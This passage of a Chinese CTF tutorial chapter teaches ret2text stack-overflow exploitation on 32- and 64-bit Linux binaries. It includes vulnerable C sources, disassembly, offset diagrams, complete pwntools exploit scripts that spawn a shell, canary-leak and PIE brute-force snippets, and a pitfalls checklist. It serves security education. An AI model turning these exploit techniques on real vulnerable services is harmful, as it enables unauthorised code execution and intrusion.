ret2text_1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2, not stripped

$ pwn checksec ret2text_1
[*] '/home/ctf/ret2text_1'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found      ← 返回地址可随意覆盖
    NX:       NX enabled           ← 栈不可执行，但本题根本不注入代码，无所谓
    PIE:      No PIE (0x8048000)   ← 地址固定，backdoor 可直接写死
```

#### 解题思路

1. IDA/objdump 发现死函数 `backdoor`，内部 `system("/bin/sh")` —— 跳它；
2. `gets` 无上限，溢出点成立；
3. 手算偏移 → 填充 + `p32(backdoor)`。

#### 静态分析

```
$ objdump -d ret2text_1 | grep -A8 "<backdoor>"
08048536 <backdoor>:                       ← backdoor = 0x08048536
 8048536: 55               push  ebp
 8048537: 89 e5            mov   ebp,esp
 8048539: 83 ec 08         sub   esp,0x8
 804853c: 83 ec 0c         sub   esp,0xc
 804853f: 68 50 86 04 08   push  0x8048650        ; "/bin/sh"
 8048544: e8 d7 fe ff ff   call  8048420 <system> ← 参数程序自己摆好了

$ objdump -d ret2text_1 | grep -B2 "call.*gets"
 8048560: 8d 45 e0         lea   eax,[ebp-0x20]   ← buf = ebp - 0x20
 8048563: 50               push  eax
 8048564: e8 d7 fe ff ff   call  8048440 <gets>
```

#### 手算偏移

```
main 栈帧（32 位）：

        低地址
        +--------------------+ <- ebp-0x20   buf 起点（溢出源点）
        |  buf[0..31]        |   32 字节
        +--------------------+ <- ebp
        |  saved ebp（4B）   |   第 32 ～ 35 字节
        +--------------------+ <- ebp+4
        |  返回地址（4B）    |   第 36 ～ 39 字节 ★
        +--------------------+
        高地址
```

offset = 0x20 + 4 = **36**。用 cyclic 复核：喂入模式串，崩溃值反查应报 offset 36，两者一致再写 exp。

#### 完整 exp

```python
# exp1.py —— 32 位：填充 + p32(backdoor)
from pwn import *

context.arch = 'i386'                     # 32 位架构：p32 按 4 字节打包
context.log_level = 'info'

elf = ELF('./ret2text_1')
# io = process('./ret2text_1')            # 本地调试用这行
io  = remote('challenge.example.com', 9999)

backdoor = elf.symbols['backdoor']        # 0x08048536
offset   = 36                             # buf(0x20) + saved ebp(4)

payload  = b'a' * offset                  # 36 字节：填满 buf 与 saved ebp
payload += p32(backdoor)                  # 覆盖返回地址 → backdoor()

io.sendlineafter(b'Welcome to ret2text!\n', payload)   # 对齐提示再发送

io.sendline(b'cat flag')                  # 已是 shell，直接执行命令
io.interactive()                          # 或全程手动交互
```

#### 运行效果

```
$ python3 exp1.py
[*] '/home/ctf/ret2text_1'
    Arch:     i386-32-little ...
$ cat flag
flag{ret2text_1s_th3_b3g1nn1ng}
```

---

### 例题 2：32 位 system + 自己布置的 "/bin/sh"（两段式输入）

#### 题面

```c
// ret2text_2.c —— 编译：gcc -m32 -no-pie -fno-stack-protector ret2text_2.c -o ret2text_2
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char name[0x20];                       // 全局可写区（.bss）

void gift() {
    system("ls");                      // 借它让 system 进 PLT，但参数不是 /bin/sh
}

int main() {
    char buf[64];
    setvbuf(stdout, 0, 2, 0);
    puts("leave your name:");
    read(0, name, 0x20);               // 输入一：0x20 字节进 bss —— 白送的可写区
    puts("now show me your data:");
    read(0, buf, 0x80);                // 输入二：buf 只有 64 却读 0x80 → 溢出 0x40
    return 0;
}
```

#### file 与 checksec

```
$ file ret2text_2
ret2text_2: ELF 32-bit LSB executable, Intel 80386, ... dynamically linked, not stripped

$ pwn checksec ret2text_2
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

#### 解题思路

1. `strings ret2text_2 | grep bin/sh` 与 `ROPgadget --string "/bin/sh"` 都查无此串；
2. 但 `system` 在 PLT：`objdump -d ret2text_2 | grep system` → `080483f0 <system@plt>`；
3. bss 的 `name` 是现成的自留地：第一轮把 `"/bin/sh\0"` 写进去，第二轮溢出时把它的地址传给 system。

#### 关键地址

```
system@plt = 0x080483f0        # objdump -d 或 elf.plt['system']
name(.bss) = 0x0804a060        # readelf -S 看 .bss，或 elf.symbols['name']
```

#### 手算偏移

```
 80485..: 8d 45 b8      lea  eax,[ebp-0x48]    ← buf = ebp - 0x48（64 字节）

        低地址
        +--------------------+ <- ebp-0x48   buf 起点
        |  buf[0..63]        |   64 字节
        +--------------------+ <- ebp
        |  saved ebp（4B）   |   第 64 ～ 67 字节
        +--------------------+ <- ebp+4
        |  返回地址（4B）    |   第 68 ～ 71 字节 → 填 system
        +--------------------+
        |  system 的返回地址 |   第 72 ～ 75 字节 → 填占位值
        +--------------------+
        |  system 的参数     |   第 76 ～ 79 字节 → 填 name 地址
        +--------------------+
        高地址
```

offset = 0x48 + 4 = **76**。read 上限 0x80 = 128 ≥ 76 + 4 + 4 + 4 = 88，参数区装得下。

#### 完整 exp

```python
# exp2.py —— 32 位：两段式，自己布置参数调用 system(name)
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

elf = ELF('./ret2text_2')
io  = process('./ret2text_2')             # 远程：remote('ip', port)

system_plt = elf.plt['system']            # 0x080483f0：PLT 里的 system
name_bss   = elf.symbols['name']          # 0x0804a060：bss 里的 name
offset     = 0x48 + 4                     # 76：buf 到返回地址

# 第一段输入：把 "/bin/sh\0" 写进 bss 的 name（read 给了 0x20 空间，足够）
io.sendafter(b'leave your name:\n', b'/bin/sh\x00')

# 第二段输入：栈溢出，构造 system(name)
payload  = b'a' * offset                  # 76 字节填充
payload += p32(system_plt)                # 返回地址 → system（ret 时跳进去）
payload += p32(0xdeadbeef)                # system 的"返回地址"占位（别漏！见 4.3）
payload += p32(name_bss)                  # system 的参数：name 地址，内容即 /bin/sh

io.sendafter(b'now show me your data:\n', payload)
io.interactive()                          # system("/bin/sh") 执行 → shell
```

变体提示：若程序没有任何第二次输入机会、bss 也不可写，而 libc 是动态链接 —— `elf.search(b'/bin/sh')` 在程序里找不到时，就会自然滑向 05 章 ret2libc（先泄露 libc 再用 libc 里的字符串）。

---

### 例题 3：64 位 pop rdi 传参调用 system

#### 题面

```c
// ret2text_3.c —— 编译：gcc -no-pie -fno-stack-protector ret2text_3.c -o ret2text_3
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char shell_cmd[] = "/bin/sh";          // .data 里躺着 /bin/sh，但没人用它

void admin() {
    system("ls -la");                  // 让 system 进 PLT
}

int main() {
    char buf[32];
    setvbuf(stdout, 0, 2, 0);
    puts("64bit ret2text demo");
    read(0, buf, 0x100);               // 溢出点：32 → 256
    return 0;
}
```

#### file 与 checksec

```
$ file ret2text_3
ret2text_3: ELF 64-bit LSB executable, x86-64, ... dynamically linked, not stripped

$ pwn checksec ret2text_3
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

#### 解题思路（找齐"三件套"）

64 位传参三件套：`pop rdi; ret` gadget、"/bin/sh" 地址、system 地址。

```bash
$ ROPgadget --binary ret2text_3 --string "/bin/sh"
0x0000000000404040 : /bin/sh              # 就是 shell_cmd 的地址

$ ROPgadget --binary ret2text_3 | grep ": pop rdi ; ret"
0x000000000040126b : pop rdi ; ret

$ ROPgadget --binary ret2text_3 | grep -w ": ret$"
0x000000000040101a : ret                  # 裸 ret，对齐垫片备用

$ objdump -d ret2text_3 | grep system@plt
0000000000401040 <system@plt>
```

pwntools 等价写法：

```python
pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
binsh   = next(elf.search(b'/bin/sh\x00'))
```

#### 手算偏移（64 位）

```
 401190: 48 8d 45 e0     lea rax,[rbp-0x20]     ← buf = rbp - 0x20

        低地址
        +--------------------+ <- rbp-0x20   buf 起点
        |  buf[0..31]        |   32 字节
        +--------------------+ <- rbp
        |  saved rbp（8B）   |   第 32 ～ 39 字节
        +--------------------+ <- rbp+8
        |  返回地址（8B）    |   第 40 ～ 47 字节 ★
        +--------------------+
        高地址
```

offset = 0x20 + 8 = **40**。

#### 执行流（对照 payload 逐行走）

```
main 的 ret        → 弹出 pop_rdi，rsp 指向 binsh_addr
pop rdi            → rdi = binsh_addr，rsp 指向 ret 垫片
ret（垫片）         → 空跳 8 字节，rsp 指向 system
ret                → 进入 system，rdi = "/bin/sh" → shell
```

#### 完整 exp

```python
# exp3.py —— 64 位：pop rdi 布置 rdi，再调 system
from pwn import *

context.arch = 'amd64'                    # 64 位：p64 按 8 字节打包
context.log_level = 'info'

elf = ELF('./ret2text_3')
io  = process('./ret2text_3')

system_plt = elf.plt['system']                     # 0x401040
binsh      = next(elf.search(b'/bin/sh\x00'))      # 0x404040（shell_cmd）
pop_rdi    = 0x40126b                     # pop rdi ; ret（ROPgadget 找到）
ret_g      = 0x40101a                     # 裸 ret：栈对齐垫片

offset   = 0x20 + 8                       # 40
payload  = b'a' * offset
payload += p64(pop_rdi)                   # 1. 返回地址 → gadget
payload += p64(binsh)                     # 2. gadget 的 pop 把它装进 rdi
payload += p64(ret_g)                     # 3. 对齐垫片：本链推导下 rsp 落点差
                                          #    8 字节，不加会崩在 movaps（见 4.4/坑5）
payload += p64(system_plt)                # 4. 最后 ret 进 system

io.sendafter(b'64bit ret2text demo\n', payload)
io.interactive()
```

关于垫片是否必要：取决于调用链上 rsp 的 16 字节对齐状态（由函数序言的 push/sub 数量共同决定）。**判断标准始终是"崩没崩在 movaps"** —— 先不加试一遍，崩了就加；有耐心就按 4.4 的 rsp 落点推一遍。详见 07 章。

---

### 例题 4：跳过 if 判断的"代码片段复用"（64 位）

#### 题面

```c
// ret2text_4.c —— 编译：gcc -no-pie -fno-stack-protector ret2text_4.c -o ret2text_4
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int is_admin = 0;                        // 全局变量，整局游戏都改不成 0x1337

void win() {
    if (is_admin == 0x1337) {            // ← 看似永远过不去的检测
        system("/bin/sh");
    }
    // 检测失败：什么都不做直接返回
}

int main() {
    char buf[48];
    setvbuf(stdout, 0, 2, 0);
    puts("become admin? try it:");
    read(0, buf, 0x80);                  // 溢出点：48 → 128
    puts("bye");
    return 0;                            // main 返回时用到被覆盖的返回地址
}
```

#### file 与 checksec

```
$ file ret2text_4
ret2text_4: ELF 64-bit LSB executable, x86-64, ... dynamically linked, not stripped

$ pwn checksec ret2text_4
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

#### 解题思路

1. `win` 存在，但被 `is_admin == 0x1337` 挡死：is_admin 在 .bss（栈溢出够不着全局变量），也没有任何代码路径把它改成 0x1337；
2. 如果 win 里没有这个 if，它就是例题 1 的普通 backdoor —— **正是这道检测逼你跳到函数中间**；
3. objdump 找出 `jne` 之后的第一条指令，跳过去：参数由片段里的 `lea + mov rdi` 自动布置，随后 `call system`。

#### 静态分析（找"干净片段"）

```
$ objdump -d ret2text_4 | grep -A14 "<win>:"
0000000000401196 <win>:
  401196: 55                   push  rbp
  401197: 48 89 e5             mov   rbp,rsp
  40119a: 8b 05 68 2e 00 00    mov   eax,DWORD PTR [rip+0x2e68]  ; is_admin
  4011a0: 3d 37 13 00 00       cmp   eax,0x1337
  4011a5: 75 0d                jne   4011b4                ← 永远会跳走
  4011a7: 48 8d 05 92 0e 00 00 lea   rax,[rip+0xe92]       ; "/bin/sh"  ★跳这里
  4011ae: 48 89 c7             mov   rdi,rax
  4011b1: e8 aa fd ff ff       call  401040 <system@plt>
  4011b6: 90                   nop
  4011b7: 5d                   pop   rbp
  4011b8: c3                   ret
```

跳转目标 = **0x4011a7**（`jne` 之后的 `lea`）。

#### 手算偏移

```
  main: 48 8d 45 d0    lea rax,[rbp-0x30]     ← buf = rbp - 0x30（48 字节）

offset = 0x30 + 8 = 56
```

#### 完整 exp

```python
# exp4.py —— 64 位：跳到 win 中段，绕过 is_admin 检测
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./ret2text_4')
io  = process('./ret2text_4')

win_mid = 0x4011a7                        # jne 之后的 lea（"/bin/sh" 布置处）
offset  = 0x30 + 8                        # 56

payload = b'a' * offset + p64(win_mid)    # main 返回时直接跳进片段

io.sendafter(b'become admin? try it:\n', payload)
io.interactive()
```

两个细节：

1. **为什么本题不需要对齐垫片**：片段里的 system 是被程序自己的 `call system` 调用的，call 自带压栈，ABI 对齐天然正确；而例题 3 是用 `ret` "裸跳"进 system，才需要垫片。这也是"跳片段"比"手拼 ROP"省心的地方；
2. **shell 退出后**：执行流会走 `nop; pop rbp; ret`，弹到我们填的 'a' 上崩溃 —— 已经拿到 shell，无所谓；若题目要求善后，把 win 中段返回后的落点也安排好即可。

变体：若程序是 `if (!strcmp(input, magic)) win();` 且 input 是栈上指针、比较目标 magic 在 .data —— 按 5.3 的思路把指针覆盖成 magic 地址，让判断恒真，同样属于"片段复用"家族。

---
## 10. 变体与扩展

### 10.1 ret2text + 格式化字符串泄露 canary（链到 08 章）

场景：checksec 显示 `Stack: Canary found`，直接覆盖返回地址会被 `*** stack smashing detected ***` 杀掉；但程序里还有 `printf(buf)` 这类格式化字符串漏洞。

流程三步：

1. **定位 canary 在格式化参数里的位置**：连打 `%p` 或用 `%n$p` 定点观察，canary 的特征是**最低字节恒为 0x00** 且 ASLR 下高位形态稳定；
2. **泄露**：`%11$p`（64 位常见槽位，具体按题调）拿到 canary 值；
3. **组 payload**：canary 之前的填充照旧，之后按 `canary + 假 rbp + backdoor` 顺序补齐，canary 必须原样写回（含最低字节的 `\x00`），一个字节都不能差。

```python
# 骨架（详细原理与槽位分析方法见 08 章）
io.sendlineafter(b'leak?', b'%11$p')            # ① 泄露 canary
canary = int(io.recvline().strip(), 16)         #    形如 0x??????????????00
assert canary & 0xff == 0                       #    最低字节必为 0，自检

payload  = b'a' * offset                        # ② 填充到 canary
payload += p64(canary)                          # ③ canary 原样放回（含 \x00）
payload += p64(0xdeadbeef)                      # ④ 覆盖 saved rbp（假值即可）
payload += p64(elf.symbols['backdoor'])         # ⑤ 返回地址 → ret2text 目标
```

### 10.2 部分覆盖返回地址（只改低 1~2 字节）

思想：不重写整个返回地址，只改低位 —— 高位沿用栈上原值，省字节、省泄露。

- **无 PIE**：返回地址高位本来就正确（如 0x08048xxx 的 0x0804），只写低 2 字节即可在段内任意换目标。设 main 返回地址 = 0x0804863b、win = 0x08048536：

```python
payload = b'a' * 36 + b'\x36\x85'      # 只覆盖低 2 字节：0x0804863b → 0x08048536
# payload 只发 38 字节；若用 sendline，第 39 字节的 \n 会落在 saved ebp，一般无害
```

- **低 1 字节**：目标与原返回地址处于同一 0x100 窗口内（如 `cmp` 判断之后没几条指令）→ 无 PIE 时 100% 命中，最常用的"跳过下一条指令"微操；
- **PIE**：低 12 位（页内偏移）不受随机化影响，覆盖低 2 字节需爆破第 2 字节的低 4 位，成功率 1/16，循环重连：

```python
while True:                                        # PIE：固定低 12 位，爆破次低 4 位
    io = remote(ip, port)
    low2 = (win_low2 & 0xf000) | (page_offset & 0x0fff)   # 组合：爆破位 + 固定页内偏移
    io.sendafter(b'?', b'a' * offset + p16(low2))
    try:
        io.recvuntil(b'WELL DONE', timeout=1)      # 有成功回显即命中
        break
    except EOFError:
        continue                                   # 未命中，重连再猜
```

细节：部分覆盖时 payload 长度不足整地址宽度，**结尾的字节落点要算清楚** —— sendline 的 `\n`、gets/fgets 补的 `\0` 都可能压到 saved ebp 或参数区，通常无害但要心里有数（详见 8 与 10.3）。

### 10.3 覆盖 saved ebp 的次生效应

`leave` = `mov esp, ebp; pop ebp`：函数收尾时，saved ebp 被弹回 ebp 寄存器，供"上一层函数"继续用 `[ebp-X]` 寻址局部变量。saved ebp 被覆盖后的连锁反应：

- **多数 ret2text 无所谓**：填充字符（'aaaa...'）把 saved ebp 一起埋了照样成功 —— 因为拿到 shell 后程序死活无所谓，且上层很少再依赖 ebp；
- **翻车场景一**：漏洞函数返回后、到达 backdoor 前，上层函数还要用 `[ebp-X]` 读写数据（比如打印 buf）→ ebp 错位导致崩溃或异常输出，exp "看起来对了却半路死" 时记得怀疑 ebp；
- **翻车场景二**：sendline 多送的 `\n`、gets 补的 `\0` 恰好改写 saved ebp 的个别字节 —— 一般无害，但偏移算错时这是排查线索；
- **主动利用**：把 saved ebp 填成可控地址，借上层 `leave; ret` 把 esp "搬"过去 —— 这是栈迁移（Stack Pivot）与 off-by-one 系列题的标准玩法，进阶见 07 章与 09 章。

---

## 11. 常见坑

**坑 1：64 位忘记传参**
现象：ret 后直接跳 system，但 rdi 是栈上残留垃圾，system 收到乱码路径，程序"没反应"或崩溃。
修复：一律 `pop rdi; ret` + binsh 再接 system；或像例题 4 那样跳"参数已布置好"的程序片段。

**坑 2：32 位参数区错位 / 假返回地址**
- 漏写假返回地址：payload 写成 `填充 + p32(system) + p32(binsh)` —— binsh 地址顶到"返回地址"位，参数位落进栈垃圾，system 执行乱码路径。三件套 `p32(system) + p32(fake_ret) + p32(binsh)` 一个都不能少；
- 假返回地址写 0：多数情况照样能拿 shell（0 只在 shell 退出后才被跳到），但它带着 4 个 `\x00`，且退出后必崩 —— 若流程要求 system 返回后继续（罕见）、或输入通路会做字符串处理（`\x00` 截断），就翻车。稳妥填 `exit` 地址或一条 `ret`。

**坑 3：sendline 多送换行**
payload 尾部多一个 `\n`：可能被下一轮输入函数先吃到（scanf/read 场景），也可能落在 saved ebp/参数区上（部分覆盖场景）。多轮交互用 `send`/`sendafter` 精确控制，交互前用 `recvuntil` 清干净缓冲。

**坑 4：`\x00` 与截断**
- gets/scanf("%s")/read 不因 `\x00` 停，payload 里可以带；但程序把输入再过一道 strcpy/strlen/printf("%s") 时，`\x00` 之后全部作废；
- 64 位地址高位的 `\x00`：read 原样写入没问题；gets/scanf 可用"只发低 6 字节、靠补 \0"技巧（见第 8 节第 6 条）；
- `\n`(0x0a) 是 gets/fgets/scanf 的天敌，payload 中地址含 0x0a/空白字节时要么换等价 gadget，要么调整方案。

**坑 5：栈对齐（movaps 崩溃）**
现象：payload 逻辑全对，本地/远程一打就崩，dmesg 或崩溃栈里出现 `movaps`。
原因：glibc 的 do_system 用 SSE 指令要求 rsp 16 字节对齐，`ret` 裸跳进 system 时对不齐。
修复：在 system 前垫一条裸 `ret`（或去掉一条已有垫片，反之亦然）。原理与通用解法见 07 章。

**坑 6：远程 libc 环境差异**
- ret2text 的核心（.text 内地址）不受 libc 影响；但若顺手引用了 libc 里的 `/bin/sh` 或 libc 符号（本地查的），远程 libc 版本不同地址全错 —— **只用程序自带的符号与字符串**，要借 libc 就走 05 章的泄露流程；
- 远程 stdout 缓冲与本地不同：本地有回显、远程"卡住" → 用 `sendafter`/`sendlineafter` 严格对齐时序；
- 极端情况远程容器没有 /bin/sh：改用 "sh"，或改打 `system("cat flag")` 一类的命令式 backdoor。

**坑 7：地址性质搞混**
- 把字符串的**文件偏移**（strings -tx 给的）当**运行时虚拟地址**用 —— 差一个段映射换算，直接用 ROPgadget/pwntools 给的 VA；
- 静态链接程序没有 PLT，`elf.plt['system']` 会拿不到，用 `elf.symbols['system']`；
- 跳函数片段时跳到指令中间 —— 只信 objdump/IDA 标出的指令边界。

---

## 12. 本章检查清单

从拿到题到 getshell，按顺序核对：

1. [ ] `file` 确认 32/64 位、动态/静态链接
2. [ ] `pwn checksec`：有无 canary（有 → 先看 10.1/08 章泄露）；PIE（无 → 直接写死地址；有 → 10.2 爆破）；NX（本题无关紧要）
3. [ ] IDA/objdump 通读：溢出函数是哪个？输入函数是什么（gets/scanf/read/fgets，决定禁用字节）？
4. [ ] 找跳板：Shift+F12 看字符串（/bin/sh、cat flag）、Functions 窗口找死代码 backdoor、确认 system 是否在 PLT
5. [ ] 64 位顺手找齐 `pop rdi; ret`、裸 `ret`；32 位确认溢出空间装得下"返回地址 + 假返回地址 + 参数"
6. [ ] 算偏移：cyclic 盲测 + 手数 `lea rax,[rbp-X]` + saved ebp 宽度（4/8），两法一致才动手
7. [ ] 对照第 8 节检查 payload 坏字符（`\n`、空白、`\x00` 视输入函数而定）
8. [ ] 组装：32 位 `[sys][fake_ret][arg]`；64 位 `[pop_rdi][arg][ret?][sys]`；无参数 backdoor 则直接 `p32/p64(目标)`
9. [ ] 本地跑通 → 换 remote 地址，核对交互时序（sendafter/recvuntil）
10. [ ] shell 里 `ls` → `cat flag`；拿不到 flag 回头查坑 1~7

---

## 相关阅读

- 上一章：[01-基础知识与工具链](01-基础知识与工具链.md) —— 栈帧结构、pwntools 基础，本章的地基
- 下一章：[03-ret2shellcode](03-ret2shellcode.md) —— 程序里没有 backdoor？自己把代码带上栈
- [04-ret2syscall](04-ret2syscall.md) —— 用 gadget 拼出 execve 系统调用
- [05-ret2libc](05-ret2libc.md) —— ret2text 的"完全体"：泄露 libc、真刀真枪调 system
- [06-ret2plt与ret2dlresolve](06-ret2plt与ret2dlresolve.md) —— 没有输出函数时的搬运与魔法
- [07-ROP高级技巧](07-ROP高级技巧.md) —— 栈对齐、Stack Pivot、ret2csu
- [08-格式化字符串漏洞](08-格式化字符串漏洞.md) —— 泄露 canary / libc 地址的瑞士军刀
- [09-整数溢出与Off-by-One](09-整数溢出与Off-by-One.md) —— 部分覆盖 ebp 与返回地址的进阶玩法
- [11-ORW与沙箱绕过](11-ORW与沙箱绕过.md) —— 拿到 shell 之上的更高追求
- [99-C语言函数手册](99-C语言函数手册.md) —— gets/read/fgets/scanf 的精确语义速查
- 返回 [README](README.md) 总目录
